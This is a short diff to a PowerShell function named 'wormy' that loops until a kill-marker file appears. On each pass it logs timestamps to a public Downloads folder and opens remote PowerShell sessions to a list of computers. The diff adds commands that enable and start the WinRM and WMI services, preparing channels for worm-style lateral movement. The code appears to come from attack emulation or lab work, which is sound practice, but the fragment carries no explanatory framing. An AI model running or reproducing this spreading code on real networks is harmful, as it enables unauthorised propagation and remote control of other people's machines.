@@ -38,7 +38,10 @@ function wormy{
     while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
     [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
     Write-Output 'slither'
-
+    Set-Service -Name WinRM -StartupType Automatic
+    Set-Service -Name Winmgmt -StartupType Automatic
+    Start-Service WinRM
+    Start-Service Winmgmt
     Foreach($i in $computerNames){
         $s = new-pssession -ComputerName $i
         Write-Output $i
